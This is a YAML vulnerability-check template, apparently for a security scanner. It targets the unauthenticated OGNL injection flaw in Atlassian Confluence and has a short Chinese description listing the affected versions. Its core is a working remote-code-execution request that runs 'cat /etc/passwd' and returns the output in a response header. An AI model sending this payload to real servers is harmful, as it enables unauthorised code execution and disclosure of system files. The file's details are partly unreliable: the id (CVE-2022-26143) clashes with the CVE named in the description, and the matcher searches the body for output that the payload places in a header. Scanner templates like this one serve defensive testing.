id: CVE-2022-26143

info:
  name: Atlassian Confluence OGNL表达式注入漏洞
  author: jijue
  severity: high
  verified: false
  description: |
    近日，Atlassian官方发布了Confluence Server和Data Center OGNL 注入漏洞（CVE-2022-26134）的安全公告，
    远程攻击者在未经身份验证的情况下，可构造OGNL表达式进行注入，实现在Confluence Server或Data Center上执行任意代码，CVSS评分为10。
    受影响版本：
    ConfluenceServerandDataCenter>=1.3.0
    ConfluenceServerandDataCenter<7.4.17
    ConfluenceServerandDataCenter<7.13.7
    ConfluenceServerandDataCenter<7.14.3
    ConfluenceServerandDataCenter<7.15.2
    ConfluenceServerandDataCenter<7.16.4
    ConfluenceServerandDataCenter<7.17.4
    ConfluenceServerandDataCenter<7.18.1
    app="ATLASSIAN-Confluence"

  rules:
    r0:
      request:
        method: GET
        path: /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22cat%20/etc/passwd%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/
      expression: response.status == 302 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
  expression: r0()
